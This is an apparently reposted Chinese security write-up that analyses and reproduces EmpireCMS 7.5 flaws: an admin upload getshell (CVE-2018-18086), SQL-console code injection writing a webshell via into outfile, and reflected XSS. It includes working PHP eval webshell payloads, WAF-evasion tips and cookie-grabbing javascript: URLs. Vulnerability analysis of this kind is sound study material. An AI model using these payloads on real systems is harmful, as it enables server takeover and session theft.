> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gXixS1EAepl_QCx9vXKr0Q)

**文章来****源：****HACK学习呀**

前言
==

本文将对EmpireCMS(帝国cms)的漏洞进行分析及复现。代码分析这一块主要还是借鉴了大佬们的一些分析思想，这里对大佬们提供的思路表示衷心的感谢。

环境搭建
====

帝国cms的默认安装路径为http://localhost/e/install，进入安装一直往下

![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzOVIRo13sER2Fo0LEJgbjExIVOsh3JYWd42U3GskkIo6AicXYQO56tmxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")![图片](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8ekm5icddh8rCXRYrOib0jzO8bZrTU746sgyZ4xb1lp0fFokGVZ7Iibbd4w4D3WJBfroh60iamZulvvQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

到连接数据库这一步，mysql版本可以选择自动识别，也可以自己选择相应版本，这里数据库如果在本地就填写localhost（127.0.0.1）。

这里也可以选择远程连接vps的服务器，但是前提是vps上的数据库开启了远程连接

首先找到`/etc/mysql/my.conf`

找到bind-address = 127.0.0.1这一行注释掉（此处没有也可以忽略）

然后新建一个admin用户允许远程登录并立即应用配置即可

```
`grant all on *.* to admin@'%' identified by '123456' with grant option;``flush privileges;`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

点击下一步就会自动在数据库生成一个empirecms的数据库并在其中建立许多个表

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

然后再设置进入后台管理员的密码

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

下一步即可安装完成，这里提示要删除路径避免被再次安装，但是这个地方其实设置了两层保护，即使你访问install这个路径会有一个.off文件在路径下，需要将这个.off文件删除后才能再次安装

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

输入设置的后台管理员用户名和密码即可进入管理员后台

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

漏洞原理及复现
=======

后台getshell(CVE-2018-18086)
--------------------------

### 漏洞原理

EmpireCMS 7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。

EmpireCMS7.5版本中的/e/class/moddofun.php文件的”LoadInMod”函数存在安全漏洞,攻击者可利用该漏洞上传任意文件。

### 源码分析

主要漏洞代码位置

//导入模型

```
`//导入模型``elseif($enews=="LoadInMod")``{` `$file=$_FILES['file']['tmp_name'];` `$file_name=$_FILES['file']['name'];` `$file_type=$_FILES['file']['type'];` `$file_size=$_FILES['file']['size'];` `LoadInMod($_POST,$file,$file_name,$file_type,$file_size,$logininid,$loginin);``}`
```

转到LoadInMod定义

在localhost/EmpireCMS/e/class/moddofun.php找到上传文件的定义

```
`//上传文件` `$path=ECMS_PATH."e/data/tmp/mod/uploadm".time().make_password(10).".php";` `$cp=@move_uploaded_file($file,$path);` `if(!$cp)` `{` `printerror("EmptyLoadInMod","");` `}` `DoChmodFile($path);` `@include($path);` `UpdateTbDefMod($tid,$tbname,$mid);`
```

文件包含

上传文件处使用time().makepassword(10)进行加密文件名

```
`//取得随机数``function make_password($pw_length){` `$low_ascii_bound=48;` `$upper_ascii_bound=122;` `$notuse=array(58,59,60,61,62,63,64,91,92,93,94,95,96);` `while($i<$pw_length)` `{` `if(PHP_VERSION<'4.2.0')` `{` `mt_srand((double)microtime()*1000000);` `}` `mt_srand();` `$randnum=mt_rand($low_ascii_bound,$upper_ascii_bound);` `if(!in_array($randnum,$notuse))` `{` `$password1=$password1.chr($randnum);` `$i++;` `}` `}` `return $password1;``}`
```

下方代码@include($path)直接包含文件，因此可以通过添加创建文件的代码绕过。

### 漏洞复现

来到导入系统模型的页面

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

本地准备一个1.php并改名为1.php.mod，注意这里需要用\$进行转义，存放的数据表名需要填一个数据库内没有的表名，点击上传

```
<?php file_put_contents("getshell.php","<?php @eval(\$_POST[cmd]); ?>");?>
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

导入成功后访问一下生成shell看能不能访问得到，没有报错是可以访问到的，那么证明已经上传成功了

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

再用蚁剑连接即可

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

### 几个实战中遇到的坑

1.有waf报错500

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

500很容易联想到禁止web流量，那么我们上传的一句话木马默认情况下是不进行加密的，所以很容易被waf识别并拦截。

解决方法：使用蚁剑自带的base64编码器和解密器即可成功上线，这里也可以用自己的编码器和解密器绕过waf拦截

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

2.不能使用冰蝎、哥斯拉马

因为要在$之前加\转义，冰蝎转义后的php.mod应该如下图所示

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

上传到模型处就无回显

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

### 实战小技巧

如果有waf拦截web流量就走加密传输，如果始终连接不上就要一步步的进行排查。这里可以在一句话密码后面输出一个echo 123，通过是否有回显来探测哪一步没有完善导致连接不成功

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

代码注入 (CVE-2018-19462)
---------------------

### 漏洞原理

EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。

该漏洞源于外部输入数据构造代码段的过程中，网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。

主要漏洞代码位置

执行sql语句处

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

分析源码定位漏洞出现的位置在localhost/EmpireCMS/e/admin/db/DoSql.php，对sqltext进行RepSqlTbpre函数处理

```
`//运行SQL语句``function ExecSql($id,$userid,$username){` `global $empire,$dbtbpre;` `$id=(int)$id;` `if(empty($id))` `{` `printerror('EmptyExecSqlid','');` `}` `$r=$empire->fetch1("select sqltext from {$dbtbpre}enewssql where id='$id'");` `if(!$r['sqltext'])` `{` `printerror('EmptyExecSqlid','');` `}` `$query=RepSqlTbpre($r['sqltext']);` `DoRunQuery($query);` `//操作日志` `insert_dolog("query=".$query);` `printerror("DoExecSqlSuccess","ListSql.php".hReturnEcmsHashStrHref2(1));``}`
```

转到定义RepSqlTbpre，发现只对表的前缀做了替换

```
`//替换表前缀``function RepSqlTbpre($sql){` `global $dbtbpre;` `$sql=str_replace('[!db.pre!]',$dbtbpre,$sql);` `return $sql;``}`
```

转到定义DoRunQuery，对$query进行处理。

对$sql参数只做了去除空格、以;分隔然后遍历,没有做别的限制和过滤,导致可以执行恶意的sql语句

```
`//运行SQL``function DoRunQuery($sql){` `global $empire;` `$sql=str_replace("\r","\n",$sql);` `$ret=array();` `$num=0;` `foreach(explode(";\n",trim($sql)) as $query)` `{` `$queries=explode("\n",trim($query));` `foreach($queries as $query)` `{` `$ret[$num].=$query[0]=='#'||$query[0].$query[1]=='--'?'':$query;` `}` `$num++;` `}` `unset($sql);` `foreach($ret as $query)` `{` `$query=trim($query);` `if($query)` `{` `$empire->query($query);` `}` `}``}`
```

### payload

用select ... into outfile语句写入php一句话木马，但是这里需要知道存放的绝对路径，这里可以使用一个phpinfo()用第一种方法传上去

```
<?php file_put_contents("getshell.php","<?php phpinfo();?>");?>
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

访问即可打出phpinfo

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

这里只是找到了php的绝对路径，还不是web所存储的路径，这时候查看源代码搜索DOCUMENT_ROOT查询网站所处的绝对路径

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

用select ... into outfile语句写入php一句话木马

```
select '<?php @eval($_POST[LEOGG])?>' into outfile 'C:/phpStudy/PHPTutorial/WWW/EmpireCMS/e/admin/Get.php'
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

看到上传已经成功

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

访问一下是存在的

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

直接上蚁剑连接即可

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

### 实战中的一些坑

我们知道secure_file_priv这个参数在mysql的配置文件里起到的是能否写入的作用，当secure_file_priv = 为空，则可以写入sql语句到数据库，当secure_file_priv = NULL，则不可以往数据库里写sql语句，当secure_file_priv = /xxx，一个指定目录的时候，就只能往这个指定的目录里面写东西

这个地方很明显报错就是限制数据库的导入跟导出，这里很明显判断secure_file_priv = NULL，所以当实战中出现在这种情况下是不能够用这种方法的

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

如果在本地可以修改或添加secure_file_priv = 这一行语句

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

后台xss
-----

### 原理分析

漏洞类型：反射型xss

漏洞文件：localhost/EmpireCMS/e/admin/openpage/AdminPage.php

漏洞原理：该漏洞是由于代码只使用htmlspecialchars进行实体编码过滤，而且参数用的是ENT_QUOTES(编码双引号和单引号),还有addslashes函数处理，但是没有对任何恶意关键字进行过滤，从而导致攻击者使用别的关键字进行攻击

源码分析

主要漏洞代码位置localhost/EmpireCMS/e/admin/openpage/AdminPage.php

```
`$leftfile=hRepPostStr($_GET['leftfile'],1);``$mainfile=hRepPostStr($_GET['mainfile'],1);`
```

利用hRepPostStr函数进行过滤，跳转到该函数的定义如下

```
`function hRepPostStr($val,$ecms=0,$phck=0){` `if($phck==1)` `{` `CkPostStrCharYh($val);` `}` `if($ecms==1)` `{` `$val=ehtmlspecialchars($val,ENT_QUOTES);` `}` `CkPostStrChar($val);` `$val=AddAddsData($val);` `return $val;``}`
```

用ehtmlspecialchars函数进行HTML实体编码过滤，其中ENT_QUOTES - 编码双引号和单引号。

```
`function ehtmlspecialchars($val,$flags=ENT_COMPAT){` `global $ecms_config;` `if(PHP_VERSION>='5.4.0')` `{` `if($ecms_config['sets']['pagechar']=='utf-8')` `{` `$char='UTF-8';` `}` `else` `{` `$char='ISO-8859-1';` `}` `$val=htmlspecialchars($val,$flags,$char);` `}` `else` `{` `$val=htmlspecialchars($val,$flags);` `}` `return $val;``}`
```

要利用htmlspecialchars函数把字符转换为HTML实体

用CkPostStrChar函数对参数进行处理

```
`function CkPostStrChar($val){` `if(substr($val,-1)=="\\")` `{` `exit();` `}``}`
```

获取字符末端第一个开始的字符串为\\，则退出函数

用AddAddsData函数对参数进行处理

```
`function AddAddsData($data){` `if(!MAGIC_QUOTES_GPC)` `{` `$data=addslashes($data);` `}` `return $data;``}`
```

如果没有开启MAGIC_QUOTES_GPC，则利用addslashes函数进行转义

addslashes()函数返回在预定义字符之前添加反斜杠的字符串

网页输出

然而输出的位置是在iframe标签的src里，这意味着之前的过滤都没有什么用。iframe标签可以执行js代码，因此可以利用javascript:alert(/xss/)触发xss

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

### payload

payload如下：

```
192.168.10.3/EmpireCMS/e/admin/openpage/AdminPage.php?ehash_3ZvP9=dQ7ordM5PCqKDgSmvkDf&mainfile=javascript:alert(/xss/)
```

其中ehash是随机生成的，在登录时可以看到ehash_3ZvP9=dQ7ordM5PCqKDgSmvkDf，如果缺少这个hash值，则会提示非法来源

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

获取cookie信息payload

```
192.168.10.3/EmpireCMS/e/admin/openpage/AdminPage.php?ehash_3ZvP9=dQ7ordM5PCqKDgSmvkDf&mainfile=javascript:alert(document.cookie)
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

前台xss
-----

### 原理分析

漏洞类型：反射型xss

漏洞文件：localhost/EmpireCMS/e/ViewImg/index.html

漏洞原理：url地址经过Request函数处理之后,把url地址中的参数和值部分直接拼接当作a标签的href属性的值和img标签的src标签的值

主要漏洞代码位置localhost/upload/e/ViewImg/index.html

```
`if(Request("url")!=0){` `document.write("<a title=\"点击观看完整的图片...\" href=\""+Request("url")+"\" target=\"_blank\"><img src=\""+Request("url")+"\" border=0 class=\"picborder\" onmousewheel=\"return bbimg(this)\" onload=\"if(this.width>screen.width-500)this.style.width=screen.width-500;\">");` `}`
```

通过Request函数获取地址栏的url参数,并作为img和a标签的src属性和href属性,然后经过document.write输出到页面。

转到request函数定义

```
`function Request(sName)``{` `/*` `get last loc. of ?` `right: find first loc. of sName` `+2` `retrieve value before next &` `  */` `  var sURL = new String(window.location);` `var iQMark= sURL.lastIndexOf('?');` `var iLensName=sName.length;` `  //retrieve loc. of sName` `var iStart = sURL.indexOf('?' + sName +'=') //limitation 1` `if (iStart==-1)` `{//not found at start` `iStart = sURL.indexOf('&' + sName +'=')//limitation 1` `if (iStart==-1)` `{//not found at end` `return 0; //not found` `}``        }` `  iStart = iStart + + iLensName + 2;` `var iTemp= sURL.indexOf('&',iStart); //next pair start` `if (iTemp ==-1)` `{//EOF` `iTemp=sURL.length;` `}``  return sURL.slice(iStart,iTemp ) ;` `sURL=null;//destroy String``}`
```

通过window.location获取当前url地址,根据传入的url参数,获取当前参数的起始位置和结束位置

### payload

url地址经过Request函数处理之后,然后把url地址中的参数和值部分直接拼接当作a标签的href属性的值和img标签的src标签的值

payload如下：

```
http://localhost/upload/e/ViewImg/index.html?url=javascript:alert(document.cookie)
```

payload解析：

当浏览器载入一个Javascript URL时，它会执行URL中所包含的Javascript代码，并且使用最后一个Javascript语句或表达式的值，转换为一个字符串，作为新载入的文档的内容显示。

javascript:伪协议可以和HTML属性一起使用，该属性的值也应该是一个URL。一个超链接的href属性就满足这种条件。当用户点击一个这样的链接，指定的Javascript代码就会执行。在这种情况下，Javascript URL本质上是一个onclick事件句柄的替代。

点击图片触发xss

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

得到网页cookie

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

**版权申明：内容来源网络，版权归原创者所有。除非无法确认，我们都会标明作者及出处，如有侵权烦请告知，我们会立即删除并表示歉意。谢谢!**

 ![网络安全编程与黑客程序员](http://mmbiz.qpic.cn/mmbiz_png/83e7tQTo0wMkqsZicPejWmM2kXgKjD1BLLSyPaIOpDt0JjyTnopoibJTSeh88sNy6P0Xpmx2UQdVdaQ6t2dAkzcg/0?wx_fmt=png) ** 网络安全编程与黑客程序员 ** 网络安全编程与黑客程序员技术社区，记录网络安全与黑客技术中优秀的内容，传播网络安全与黑客技术文化，分享典型网络安全知识和案例！未知攻，焉知防。攻防兼顾，方知安全！程序员改变世界！ 255篇原创内容   公众号